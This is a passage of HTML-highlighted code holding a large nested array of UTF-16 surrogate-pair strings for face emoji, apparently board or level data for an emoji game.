<span class="string">&quot;d83d,de2c&quot;</span>, <span class="string">&quot;d83d,de19&quot;</span>, <span class="string">&quot;d83d,de0a&quot;</span>, <span class="string">&quot;d83d,de00&quot;</span>, <span class="string">&quot;d83d,de0c&quot;</span>, <span class="string">&quot;d83d,de10&quot;</span>, <span class="string">&quot;d83d,de0d&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">&quot;d83d,de25&quot;</span>, <span class="string">&quot;d83d,de15&quot;</span>, <span class="string">&quot;d83d,de2d&quot;</span>, <span class="string">&quot;d83d,de1b&quot;</span>, <span class="string">&quot;d83d,de00&quot;</span>, <span class="string">&quot;d83d,de21&quot;</span>, <span class="string">&quot;d83d,de03&quot;</span>, <span class="string">&quot;d83d,de1c&quot;</span>, <span class="string">&quot;d83d,de1b&quot;</span>, <span class="string">&quot;d83d,de26&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de17&quot;</span>, <span class="string">&quot;d83d,de14&quot;</span>, <span class="string">&quot;d83d,de10&quot;</span>, <span class="string">&quot;d83d,de2a&quot;</span>, <span class="string">&quot;d83d,de29&quot;</span>, <span class="string">&quot;d83d,de24&quot;</span>, <span class="string">&quot;d83d,de2f&quot;</span>, <span class="string">&quot;d83d,de1c&quot;</span>, <span class="string">&quot;d83d,de12&quot;</span>, <span class="string">&quot;d83d,de0f&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de10&quot;</span>, <span class="string">&quot;d83d,de09&quot;</span>, <span class="string">&quot;d83d,de23&quot;</span>, <span class="string">&quot;d83d,de26&quot;</span>, <span class="string">&quot;d83d,de13&quot;</span>, <span class="string">&quot;d83d,de13&quot;</span>, <span class="string">&quot;d83d,de0a&quot;</span>, <span class="string">&quot;d83d,de1b&quot;</span>, <span class="string">&quot;d83d,de2b&quot;</span>, <span class="string">&quot;d83d,de2a&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de21&quot;</span>, <span class="string">&quot;d83d,de25&quot;</span>, <span class="string">&quot;d83d,de01&quot;</span>, <span class="string">&quot;d83d,de24&quot;</span>, <span class="string">&quot;d83d,de07&quot;</span>, <span class="string">&quot;d83d,de27&quot;</span>, <span class="string">&quot;d83d,de1d&quot;</span>, <span class="string">&quot;d83d,de0d&quot;</span>, <span class="string">&quot;d83d,de24&quot;</span>, <span class="string">&quot;d83d,de0f&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de24&quot;</span>, <span class="string">&quot;d83d,de21&quot;</span>, <span class="string">&quot;d83d,de0c&quot;</span>, <span class="string">&quot;d83d,de21&quot;</span>, <span class="string">&quot;d83d,de26&quot;</span>, <span class="string">&quot;d83d,de24&quot;</span>, <span class="string">&quot;d83d,de23&quot;</span>, <span class="string">&quot;d83d,de0f&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">&quot;d83d,de27&quot;</span>, <span class="string">&quot;d83d,de11&quot;</span>, <span class="string">&quot;d83d,de1b&quot;</span>, <span class="string">&quot;d83d,de17&quot;</span>, <span class="string">&quot;d83d,de14&quot;</span>, <span class="string">&quot;d83d,de0b&quot;</span>, <span class="string">&quot;d83d,de0c&quot;</span>, <span class="string">&quot;d83d,de1b&quot;</span>, <span class="string">&quot;d83d,de20&quot;</span>, <span class="string">&quot;d83d,de1b&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de26&quot;</span>, <span class="string">&quot;d83d,de21&quot;</span>, <span class="string">&quot;d83d,de06&quot;</span>, <span class="string">&quot;d83d,de10&quot;</span>, <span class="string">&quot;d83d,de17&quot;</span>, <span class="string">&quot;d83d,de23&quot;</span>, <span class="string">&quot;d83d,de23&quot;</span>, <span class="string">&quot;d83d,de25&quot;</span>, <span class="string">&quot;d83d,de10&quot;</span>, <span class="string">&quot;d83d,de17&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de1d&quot;</span>, <span class="string">&quot;d83d,de22&quot;</span>, <span class="string">&quot;d83d,de0e&quot;</span>, <span class="string">&quot;d83d,de27&quot;</span>, <span class="string">&quot;d83d,de08&quot;</span>, <span class="string">&quot;d83d,de08&quot;</span>, <span class="string">&quot;d83d,de03&quot;</span>, <span class="string">&quot;d83d,de1b&quot;</span>, <span class="string">&quot;d83d,de2b&quot;</span>, <span class="string">&quot;d83d,de2a&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de16&quot;</span>, <span class="string">&quot;d83d,de09&quot;</span>, <span class="string">&quot;d83d,de18&quot;</span>, <span class="string">&quot;d83d,de1f&quot;</span>, <span class="string">&quot;d83d,de13&quot;</span>, <span class="string">&quot;d83d,de2d&quot;</span>, <span class="string">&quot;d83d,de08&quot;</span>, <span class="string">&quot;d83d,de22&quot;</span>, <span class="string">&quot;d83d,de02&quot;</span>, <span class="string">&quot;d83d,de12&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de11&quot;</span>, <span class="string">&quot;d83d,de2d&quot;</span>, <span class="string">&quot;d83d,de10&quot;</span>, <span class="string">&quot;d83d,de2d&quot;</span>, <span class="string">&quot;d83d,de12&quot;</span>, <span class="string">&quot;d83d,de18&quot;</span>, <span class="string">&quot;d83d,de28&quot;</span>, <span class="string">&quot;d83d,de0b&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">&quot;d83d,de00&quot;</span>, <span class="string">&quot;d83d,de24&quot;</span>, <span class="string">&quot;d83d,de0f&quot;</span>, <span class="string">&quot;d83d,de2a&quot;</span>, <span class="string">&quot;d83d,de2a&quot;</span>, <span class="string">&quot;d83d,de13&quot;</span>, <span class="string">&quot;d83d,de12&quot;</span>, <span class="string">&quot;d83d,de16&quot;</span>, <span class="string">&quot;d83d,de1d&quot;</span>, <span class="string">&quot;d83d,de24&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de25&quot;</span>, <span class="string">&quot;d83d,de04&quot;</span>, <span class="string">&quot;d83d,de05&quot;</span>, <span class="string">&quot;d83d,de04&quot;</span>, <span class="string">&quot;d83d,de11&quot;</span>, <span class="string">&quot;d83d,de22&quot;</span>, <span class="string">&quot;d83d,de0a&quot;</span>, <span class="string">&quot;d83d,de19&quot;</span>, <span class="string">&quot;d83d,de21&quot;</span>, <span class="string">&quot;d83d,de02&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de1e&quot;</span>, <span class="string">&quot;d83d,de25&quot;</span>, <span class="string">&quot;d83d,de1a&quot;</span>, <span class="string">&quot;d83d,de10&quot;</span>, <span class="string">&quot;d83d,de22&quot;</span>, <span class="string">&quot;d83d,de2a&quot;</span>, <span class="string">&quot;d83d,de12&quot;</span>, <span class="string">&quot;d83d,de09&quot;</span>, <span class="string">&quot;d83d,de05&quot;</span>, <span class="string">&quot;d83d,de2d&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de03&quot;</span>, <span class="string">&quot;d83d,de2a&quot;</span>, <span class="string">&quot;d83d,de18&quot;</span>, <span class="string">&quot;d83d,de0b&quot;</span>, <span class="string">&quot;d83d,de07&quot;</span>, <span class="string">&quot;d83d,de1b&quot;</span>, <span class="string">&quot;d83d,de20&quot;</span>, <span class="string">&quot;d83d,de03&quot;</span>, <span class="string">&quot;d83d,de17&quot;</span>, <span class="string">&quot;d83d,de2b&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de1d&quot;</span>, <span class="string">&quot;d83d,de0d&quot;</span>, <span class="string">&quot;d83d,de05&quot;</span>, <span class="string">&quot;d83d,de23&quot;</span>, <span class="string">&quot;d83d,de14&quot;</span>, <span class="string">&quot;d83d,de17&quot;</span>, <span class="string">&quot;d83d,de01&quot;</span>, <span class="string">&quot;d83d,de16&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">&quot;d83d,de12&quot;</span>, <span class="string">&quot;d83d,de16&quot;</span>, <span class="string">&quot;d83d,de2d&quot;</span>, <span class="string">&quot;d83d,de21&quot;</span>, <span class="string">&quot;d83d,de0b&quot;</span>, <span class="string">&quot;d83d,de20&quot;</span>, <span class="string">&quot;d83d,de1f&quot;</span>, <span class="string">&quot;d83d,de0e&quot;</span>, <span class="string">&quot;d83d,de1e&quot;</span>, <span class="string">&quot;d83d,de0b&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de28&quot;</span>, <span class="string">&quot;d83d,de27&quot;</span>, <span class="string">&quot;d83d,de15&quot;</span>, <span class="string">&quot;d83d,de0b&quot;</span>, <span class="string">&quot;d83d,de22&quot;</span>, <span class="string">&quot;d83d,de0b&quot;</span>, <span class="string">&quot;d83d,de02&quot;</span>, <span class="string">&quot;d83d,de0e&quot;</span>, <span class="string">&quot;d83d,de1a&quot;</span>, <span class="string">&quot;d83d,de0b&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de25&quot;</span>, <span class="string">&quot;d83d,de26&quot;</span>, <span class="string">&quot;d83d,de1d&quot;</span>, <span class="string">&quot;d83d,de17&quot;</span>, <span class="string">&quot;d83d,de2d&quot;</span>, <span class="string">&quot;d83d,de21&quot;</span>, <span class="string">&quot;d83d,de17&quot;</span>, <span class="string">&quot;d83d,de19&quot;</span>, <span class="string">&quot;d83d,de16&quot;</span>, <span class="string">&quot;d83d,de04&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de29&quot;</span>, <span class="string">&quot;d83d,de05&quot;</span>, <span class="string">&quot;d83d,de00&quot;</span>, <span class="string">&quot;d83d,de19&quot;</span>, <span class="string">&quot;d83d,de1e&quot;</span>, <span class="string">&quot;d83d,de24&quot;</span>, <span class="string">&quot;d83d,de2d&quot;</span>, <span class="string">&quot;d83d,de24&quot;</span>, <span class="string">&quot;d83d,de1a&quot;</span>, <span class="string">&quot;d83d,de0f&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de13&quot;</span>, <span class="string">&quot;d83d,de0a&quot;</span>, <span class="string">&quot;d83d,de1a&quot;</span>, <span class="string">&quot;d83d,de1f&quot;</span>, <span class="string">&quot;d83d,de03&quot;</span>, <span class="string">&quot;d83d,de28&quot;</span>, <span class="string">&quot;d83d,de29&quot;</span>, <span class="string">&quot;d83d,de08&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">&quot;d83d,de19&quot;</span>, <span class="string">&quot;d83d,de09&quot;</span>, <span class="string">&quot;d83d,de0c&quot;</span>, <span class="string">&quot;d83d,de19&quot;</span>, <span class="string">&quot;d83d,de28&quot;</span>, <span class="string">&quot;d83d,de13&quot;</span>, <span class="string">&quot;d83d,de1e&quot;</span>, <span class="string">&quot;d83d,de0d&quot;</span>, <span class="string">&quot;d83d,de02&quot;</span>, <span class="string">&quot;d83d,de23&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de1f&quot;</span>, <span class="string">&quot;d83d,de0f&quot;</span>, <span class="string">&quot;d83d,de05&quot;</span>, <span class="string">&quot;d83d,de00&quot;</span>, <span class="string">&quot;d83d,de10&quot;</span>, <span class="string">&quot;d83d,de19&quot;</span>, <span class="string">&quot;d83d,de26&quot;</span>, <span class="string">&quot;d83d,de2f&quot;</span>, <span class="string">&quot;d83d,de26&quot;</span>, <span class="string">&quot;d83d,de26&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de06&quot;</span>, <span class="string">&quot;d83d,de1b&quot;</span>, <span class="string">&quot;d83d,de06&quot;</span>, <span class="string">&quot;d83d,de0f&quot;</span>, <span class="string">&quot;d83d,de0a&quot;</span>, <span class="string">&quot;d83d,de02&quot;</span>, <span class="string">&quot;d83d,de0d&quot;</span>, <span class="string">&quot;d83d,de0d&quot;</span>, <span class="string">&quot;d83d,de03&quot;</span>, <span class="string">&quot;d83d,de01&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de04&quot;</span>, <span class="string">&quot;d83d,de19&quot;</span>, <span class="string">&quot;d83d,de21&quot;</span>, <span class="string">&quot;d83d,de07&quot;</span>, <span class="string">&quot;d83d,de06&quot;</span>, <span class="string">&quot;d83d,de21&quot;</span>, <span class="string">&quot;d83d,de15&quot;</span>, <span class="string">&quot;d83d,de18&quot;</span>, <span class="string">&quot;d83d,de15&quot;</span>, <span class="string">&quot;d83d,de2d&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de1a&quot;</span>, <span class="string">&quot;d83d,de2f&quot;</span>, <span class="string">&quot;d83d,de1c&quot;</span>, <span class="string">&quot;d83d,de0e&quot;</span>, <span class="string">&quot;d83d,de18&quot;</span>, <span class="string">&quot;d83d,de0e&quot;</span>, <span class="string">&quot;d83d,de20&quot;</span>, <span class="string">&quot;d83d,de06&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">&quot;d83d,de13&quot;</span>, <span class="string">&quot;d83d,de0b&quot;</span>, <span class="string">&quot;d83d,de1c&quot;</span>, <span class="string">&quot;d83d,de07&quot;</span>, <span class="string">&quot;d83d,de2f&quot;</span>, <span class="string">&quot;d83d,de27&quot;</span>, <span class="string">&quot;d83d,de17&quot;</span>, <span class="string">&quot;d83d,de2a&quot;</span>, <span class="string">&quot;d83d,de0c&quot;</span>, <span class="string">&quot;d83d,de17&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de2e&quot;</span>, <span class="string">&quot;d83d,de08&quot;</span>, <span class="string">&quot;d83d,de1b&quot;</span>, <span class="string">&quot;d83d,de0d&quot;</span>, <span class="string">&quot;d83d,de00&quot;</span>, <span class="string">&quot;d83d,de12&quot;</span>, <span class="string">&quot;d83d,de15&quot;</span>, <span class="string">&quot;d83d,de12&quot;</span>, <span class="string">&quot;d83d,de1c&quot;</span>, <span class="string">&quot;d83d,de06&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de1a&quot;</span>, <span class="string">&quot;d83d,de29&quot;</span>, <span class="string">&quot;d83d,de0f&quot;</span>, <span class="string">&quot;d83d,de2b&quot;</span>, <span class="string">&quot;d83d,de0f&quot;</span>, <span class="string">&quot;d83d,de05&quot;</span>, <span class="string">&quot;d83d,de20&quot;</span>, <span class="string">&quot;d83d,de03&quot;</span>, <span class="string">&quot;d83d,de2f&quot;</span>, <span class="string">&quot;d83d,de1e&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de23&quot;</span>, <span class="string">&quot;d83d,de0d&quot;</span>, <span class="string">&quot;d83d,de02&quot;</span>, <span class="string">&quot;d83d,de2f&quot;</span>, <span class="string">&quot;d83d,de00&quot;</span>, <span class="string">&quot;d83d,de19&quot;</span>, <span class="string">&quot;d83d,de2f&quot;</span>, <span class="string">&quot;d83d,de10&quot;</span>, <span class="string">&quot;d83d,de0d&quot;</span>, <span class="string">&quot;d83d,de12&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de19&quot;</span>, <span class="string">&quot;d83d,de18&quot;</span>, <span class="string">&quot;d83d,de19&quot;</span>, <span class="string">&quot;d83d,de08&quot;</span>, <span class="string">&quot;d83d,de09&quot;</span>, <span class="string">&quot;d83d,de1f&quot;</span>, <span class="string">&quot;d83d,de1f&quot;</span>, <span class="string">&quot;d83d,de01&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">&quot;d83d,de12&quot;</span>, <span class="string">&quot;d83d,de00&quot;</span>, <span class="string">&quot;d83d,de03&quot;</span>, <span class="string">&quot;d83d,de2f&quot;</span>, <span class="string">&quot;d83d,de2a&quot;</span>, <span class="string">&quot;d83d,de21&quot;</span>, <span class="string">&quot;d83d,de1b&quot;</span>, <span class="string">&quot;d83d,de1e&quot;</span>, <span class="string">&quot;d83d,de2b&quot;</span>, <span class="string">&quot;d83d,de0e&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de28&quot;</span>, <span class="string">&quot;d83d,de12&quot;</span>, <span class="string">&quot;d83d,de05&quot;</span>, <span class="string">&quot;d83d,de2f&quot;</span>, <span class="string">&quot;d83d,de2d&quot;</span>, <span class="string">&quot;d83d,de22&quot;</span>, <span class="string">&quot;d83d,de0f&quot;</span>, <span class="string">&quot;d83d,de25&quot;</span>, <span class="string">&quot;d83d,de1d&quot;</span>, <span class="string">&quot;d83d,de2a&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de28&quot;</span>, <span class="string">&quot;d83d,de2f&quot;</span>, <span class="string">&quot;d83d,de26&quot;</span>, <span class="string">&quot;d83d,de2f&quot;</span>, <span class="string">&quot;d83d,de1f&quot;</span>, <span class="string">&quot;d83d,de1b&quot;</span>, <span class="string">&quot;d83d,de18&quot;</span>, <span class="string">&quot;d83d,de16&quot;</span>, <span class="string">&quot;d83d,de0e&quot;</span>, <span class="string">&quot;d83d,de1f&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de2c&quot;</span>, <span class="string">&quot;d83d,de01&quot;</span>, <span class="string">&quot;d83d,de2d&quot;</span>, <span class="string">&quot;d83d,de09&quot;</span>, <span class="string">&quot;d83d,de28&quot;</span>, <span class="string">&quot;d83d,de2c&quot;</span>, <span class="string">&quot;d83d,de0d&quot;</span>, <span class="string">&quot;d83d,de13&quot;</span>, <span class="string">&quot;d83d,de17&quot;</span>, <span class="string">&quot;d83d,de04&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de0f&quot;</span>, <span class="string">&quot;d83d,de1d&quot;</span>, <span class="string">&quot;d83d,de07&quot;</span>, <span class="string">&quot;d83d,de2f&quot;</span>, <span class="string">&quot;d83d,de06&quot;</span>, <span class="string">&quot;d83d,de08&quot;</span>, <span class="string">&quot;d83d,de0c&quot;</span>, <span class="string">&quot;d83d,de0f&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">&quot;d83d,de1e&quot;</span>, <span class="string">&quot;d83d,de15&quot;</span>, <span class="string">&quot;d83d,de1b&quot;</span>, <span class="string">&quot;d83d,de01&quot;</span>, <span class="string">&quot;d83d,de08&quot;</span>, <span class="string">&quot;d83d,de2f&quot;</span>, <span class="string">&quot;d83d,de1a&quot;</span>, <span class="string">&quot;d83d,de0e&quot;</span>, <span class="string">&quot;d83d,de1a&quot;</span>, <span class="string">&quot;d83d,de14&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de04&quot;</span>, <span class="string">&quot;d83d,de0d&quot;</span>, <span class="string">&quot;d83d,de23&quot;</span>, <span class="string">&quot;d83d,de13&quot;</span>, <span class="string">&quot;d83d,de00&quot;</span>, <span class="string">&quot;d83d,de2f&quot;</span>, <span class="string">&quot;d83d,de29&quot;</span>, <span class="string">&quot;d83d,de15&quot;</span>, <span class="string">&quot;d83d,de08&quot;</span>, <span class="string">&quot;d83d,de25&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de17&quot;</span>, <span class="string">&quot;d83d,de26&quot;</span>, <span class="string">&quot;d83d,de15&quot;</span>, <span class="string">&quot;d83d,de22&quot;</span>, <span class="string">&quot;d83d,de2a&quot;</span>, <span class="string">&quot;d83d,de00&quot;</span>, <span class="string">&quot;d83d,de07&quot;</span>, <span class="string">&quot;d83d,de05&quot;</span>, <span class="string">&quot;d83d,de03&quot;</span>, <span class="string">&quot;d83d,de2e&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de07&quot;</span>, <span class="string">&quot;d83d,de10&quot;</span>, <span class="string">&quot;d83d,de25&quot;</span>, <span class="string">&quot;d83d,de1f&quot;</span>, <span class="string">&quot;d83d,de11&quot;</span>, <span class="string">&quot;d83d,de1a&quot;</span>, <span class="string">&quot;d83d,de1d&quot;</span>, <span class="string">&quot;d83d,de00&quot;</span>, <span class="string">&quot;d83d,de1f&quot;</span>, <span class="string">&quot;d83d,de23&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de01&quot;</span>, <span class="string">&quot;d83d,de0b&quot;</span>, <span class="string">&quot;d83d,de0f&quot;</span>, <span class="string">&quot;d83d,de21&quot;</span>, <span class="string">&quot;d83d,de1f&quot;</span>, <span class="string">&quot;d83d,de1a&quot;</span>, <span class="string">&quot;d83d,de07&quot;</span>, <span class="string">&quot;d83d,de08&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">&quot;d83d,de19&quot;</span>, <span class="string">&quot;d83d,de2b&quot;</span>, <span class="string">&quot;d83d,de13&quot;</span>, <span class="string">&quot;d83d,de12&quot;</span>, <span class="string">&quot;d83d,de0b&quot;</span>, <span class="string">&quot;d83d,de15&quot;</span>, <span class="string">&quot;d83d,de0c&quot;</span>, <span class="string">&quot;d83d,de1c&quot;</span>, <span class="string">&quot;d83d,de1e&quot;</span>, <span class="string">&quot;d83d,de2a&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de2d&quot;</span>, <span class="string">&quot;d83d,de2a&quot;</span>, <span class="string">&quot;d83d,de0f&quot;</span>, <span class="string">&quot;d83d,de2b&quot;</span>, <span class="string">&quot;d83d,de1d&quot;</span>, <span class="string">&quot;d83d,de08&quot;</span>, <span class="string">&quot;d83d,de1f&quot;</span>, <span class="string">&quot;d83d,de0b&quot;</span>, <span class="string">&quot;d83d,de04&quot;</span>, <span class="string">&quot;d83d,de04&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de2b&quot;</span>, <span class="string">&quot;d83d,de22&quot;</span>, <span class="string">&quot;d83d,de2d&quot;</span>, <span class="string">&quot;d83d,de14&quot;</span>, <span class="string">&quot;d83d,de17&quot;</span>, <span class="string">&quot;d83d,de22&quot;</span>, <span class="string">&quot;d83d,de25&quot;</span>, <span class="string">&quot;d83d,de09&quot;</span>, <span class="string">&quot;d83d,de18&quot;</span>, <span class="string">&quot;d83d,de16&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de26&quot;</span>, <span class="string">&quot;d83d,de02&quot;</span>, <span class="string">&quot;d83d,de1c&quot;</span>, <span class="string">&quot;d83d,de21&quot;</span>, <span class="string">&quot;d83d,de2d&quot;</span>, <span class="string">&quot;d83d,de13&quot;</span>, <span class="string">&quot;d83d,de14&quot;</span>, <span class="string">&quot;d83d,de1a&quot;</span>, <span class="string">&quot;d83d,de15&quot;</span>, <span class="string">&quot;d83d,de26&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de17&quot;</span>, <span class="string">&quot;d83d,de03&quot;</span>, <span class="string">&quot;d83d,de01&quot;</span>, <span class="string">&quot;d83d,de20&quot;</span>, <span class="string">&quot;d83d,de06&quot;</span>, <span class="string">&quot;d83d,de1d&quot;</span>, <span class="string">&quot;d83d,de2a&quot;</span>, <span class="string">&quot;d83d,de1c&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">&quot;d83d,de04&quot;</span>, <span class="string">&quot;d83d,de23&quot;</span>, <span class="string">&quot;d83d,de1b&quot;</span>, <span class="string">&quot;d83d,de2d&quot;</span>, <span class="string">&quot;d83d,de0a&quot;</span>, <span class="string">&quot;d83d,de2d&quot;</span>, <span class="string">&quot;d83d,de2f&quot;</span>, <span class="string">&quot;d83d,de2d&quot;</span>, <span class="string">&quot;d83d,de12&quot;</span>, <span class="string">&quot;d83d,de1e&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de08&quot;</span>, <span class="string">&quot;d83d,de20&quot;</span>, <span class="string">&quot;d83d,de11&quot;</span>, <span class="string">&quot;d83d,de1b&quot;</span>, <span class="string">&quot;d83d,de07&quot;</span>, <span class="string">&quot;d83d,de1e&quot;</span>, <span class="string">&quot;d83d,de1a&quot;</span>, <span class="string">&quot;d83d,de1f&quot;</span>, <span class="string">&quot;d83d,de02&quot;</span>, <span class="string">&quot;d83d,de16&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de10&quot;</span>, <span class="string">&quot;d83d,de12&quot;</span>, <span class="string">&quot;d83d,de05&quot;</span>, <span class="string">&quot;d83d,de05&quot;</span>, <span class="string">&quot;d83d,de14&quot;</span>, <span class="string">&quot;d83d,de0d&quot;</span>, <span class="string">&quot;d83d,de02&quot;</span>, <span class="string">&quot;d83d,de0e&quot;</span>, <span class="string">&quot;d83d,de18&quot;</span>, <span class="string">&quot;d83d,de24&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de0e&quot;</span>, <span class="string">&quot;d83d,de0c&quot;</span>, <span class="string">&quot;d83d,de01&quot;</span>, <span class="string">&quot;d83d,de1e&quot;</span>, <span class="string">&quot;d83d,de2b&quot;</span>, <span class="string">&quot;d83d,de29&quot;</span>, <span class="string">&quot;d83d,de06&quot;</span>, <span class="string">&quot;d83d,de08&quot;</span>, <span class="string">&quot;d83d,de26&quot;</span>, <span class="string">&quot;d83d,de1c&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de2a&quot;</span>, <span class="string">&quot;d83d,de16&quot;</span>, <span class="string">&quot;d83d,de18&quot;</span>, <span class="string">&quot;d83d,de05&quot;</span>, <span class="string">&quot;d83d,de26&quot;</span>, <span class="string">&quot;d83d,de28&quot;</span>, <span class="string">&quot;d83d,de24&quot;</span>, <span class="string">&quot;d83d,de04&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">&quot;d83d,de0e&quot;</span>, <span class="string">&quot;d83d,de22&quot;</span>, <span class="string">&quot;d83d,de0e&quot;</span>, <span class="string">&quot;d83d,de2e&quot;</span>, <span class="string">&quot;d83d,de01&quot;</span>, <span class="string">&quot;d83d,de26&quot;</span>, <span class="string">&quot;d83d,de05&quot;</span>, <span class="string">&quot;d83d,de27&quot;</span>, <span class="string">&quot;d83d,de2e&quot;</span>, <span class="string">&quot;d83d,de19&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de1e&quot;</span>, <span class="string">&quot;d83d,de25&quot;</span>, <span class="string">&quot;d83d,de1e&quot;</span>, <span class="string">&quot;d83d,de2c&quot;</span>, <span class="string">&quot;d83d,de26&quot;</span>, <span class="string">&quot;d83d,de0f&quot;</span>, <span class="string">&quot;d83d,de0c&quot;</span>, <span class="string">&quot;d83d,de11&quot;</span>, <span class="string">&quot;d83d,de1d&quot;</span>, <span class="string">&quot;d83d,de1e&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de08&quot;</span>, <span class="string">&quot;d83d,de22&quot;</span>, <span class="string">&quot;d83d,de2c&quot;</span>, <span class="string">&quot;d83d,de1e&quot;</span>, <span class="string">&quot;d83d,de2f&quot;</span>, <span class="string">&quot;d83d,de0b&quot;</span>, <span class="string">&quot;d83d,de01&quot;</span>, <span class="string">&quot;d83d,de13&quot;</span>, <span class="string">&quot;d83d,de0d&quot;</span>, <span class="string">&quot;d83d,de16&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de0c&quot;</span>, <span class="string">&quot;d83d,de21&quot;</span>, <span class="string">&quot;d83d,de21&quot;</span>, <span class="string">&quot;d83d,de21&quot;</span>, <span class="string">&quot;d83d,de25&quot;</span>, <span class="string">&quot;d83d,de24&quot;</span>, <span class="string">&quot;d83d,de27&quot;</span>, <span class="string">&quot;d83d,de0c&quot;</span>, <span class="string">&quot;d83d,de2e&quot;</span>, <span class="string">&quot;d83d,de13&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de09&quot;</span>, <span class="string">&quot;d83d,de14&quot;</span>, <span class="string">&quot;d83d,de0d&quot;</span>, <span class="string">&quot;d83d,de25&quot;</span>, <span class="string">&quot;d83d,de26&quot;</span>, <span class="string">&quot;d83d,de11&quot;</span>, <span class="string">&quot;d83d,de22&quot;</span>, <span class="string">&quot;d83d,de2d&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">&quot;d83d,de08&quot;</span>, <span class="string">&quot;d83d,de2d&quot;</span>, <span class="string">&quot;d83d,de2b&quot;</span>, <span class="string">&quot;d83d,de1a&quot;</span>, <span class="string">&quot;d83d,de01&quot;</span>, <span class="string">&quot;d83d,de1c&quot;</span>, <span class="string">&quot;d83d,de0f&quot;</span>, <span class="string">&quot;d83d,de23&quot;</span>, <span class="string">&quot;d83d,de27&quot;</span>, <span class="string">&quot;d83d,de06&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de08&quot;</span>, <span class="string">&quot;d83d,de1a&quot;</span>, <span class="string">&quot;d83d,de29&quot;</span>, <span class="string">&quot;d83d,de16&quot;</span>, <span class="string">&quot;d83d,de1c&quot;</span>, <span class="string">&quot;d83d,de15&quot;</span>, <span class="string">&quot;d83d,de08&quot;</span>, <span class="string">&quot;d83d,de15&quot;</span>, <span class="string">&quot;d83d,de00&quot;</span>, <span class="string">&quot;d83d,de0e&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de28&quot;</span>, <span class="string">&quot;d83d,de06&quot;</span>, <span class="string">&quot;d83d,de1f&quot;</span>, <span class="string">&quot;d83d,de29&quot;</span>, <span class="string">&quot;d83d,de04&quot;</span>, <span class="string">&quot;d83d,de18&quot;</span>, <span class="string">&quot;d83d,de14&quot;</span>, <span class="string">&quot;d83d,de1a&quot;</span>, <span class="string">&quot;d83d,de2b&quot;</span>, <span class="string">&quot;d83d,de1d&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de24&quot;</span>, <span class="string">&quot;d83d,de01&quot;</span>, <span class="string">&quot;d83d,de05&quot;</span>, <span class="string">&quot;d83d,de07&quot;</span>, <span class="string">&quot;d83d,de06&quot;</span>, <span class="string">&quot;d83d,de2a&quot;</span>, <span class="string">&quot;d83d,de04&quot;</span>, <span class="string">&quot;d83d,de23&quot;</span>, <span class="string">&quot;d83d,de12&quot;</span>, <span class="string">&quot;d83d,de15&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de27&quot;</span>, <span 